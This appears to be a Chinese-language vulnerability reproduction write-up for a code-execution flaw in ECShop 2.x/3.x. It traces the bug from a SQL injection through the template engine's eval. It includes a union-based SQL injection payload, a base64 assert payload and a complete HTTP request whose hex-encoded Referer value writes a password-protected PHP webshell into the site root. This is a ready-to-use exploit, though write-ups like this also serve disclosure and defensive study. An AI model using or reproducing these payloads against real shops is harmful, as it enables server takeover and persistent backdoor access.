# ECShop <= 2.7.x 代码执行漏洞

### 一、漏洞简介

### 二、漏洞影响

ECShop（2.x、3.0.x、3.6.x）

### 三、复现过程

漏洞分析

![](images/15889997047304.png)


继续看fetch函数

![](images/15889997121670.png)


追踪_eval函数

![](images/15889997184110.png)


`$position_style`变量来源于数据库中的查询结构

![](images/15889997290903.png)


然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询

![](images/15889997359757.png)


**payload**


```sql
SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1535678679' AND end_time >= '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- -
```

函数中有一个判断

![](images/15889997531505.png)


我们 id传入`’/*`

num传入`*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -`就能绕过了

![](images/15889997666860.png)


var_dump一下

![](images/15889997748176.png)


![](images/15889997778543.png)


再看fetch函数,传入的参数被fetch_str函数处理了

![](images/15889997846147.png)


追踪fetch_str函数，这里的字符串处理流程比较复杂

![](images/15889997939452.png)



```
return preg_replace("/{([^\}\{\n]*)}/e", "\$this->select('\\1');", $source);
```

这一行意思是比如`$source是xxxx{$asd}xxx`,那么经过这行代码处理后就是返回`this->select(‘$asd’)`的结果

看看select函数

![](images/15889998134426.png)


第一个字符为`$时进入$this->get_val`函数

![](images/15889998250064.png)


我们`$val`没有`.$又进入make_var`函数

![](images/15889998410510.png)


最后这里引入单引号从变量中逃逸

![](images/15889998476334.png)


我们要闭合_var所以最终payload是


```bash
{$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ=='));//}xxx
```

会在网站跟目录生成1.txt 里面内容是getshell

![](images/15889998717195.png)


**poc**


```bash
GET /user.php?act=login HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

会在网站根目录生成1.php 密码是1337

**参考链接**

https://cloud.tencent.com/developer/article/1333449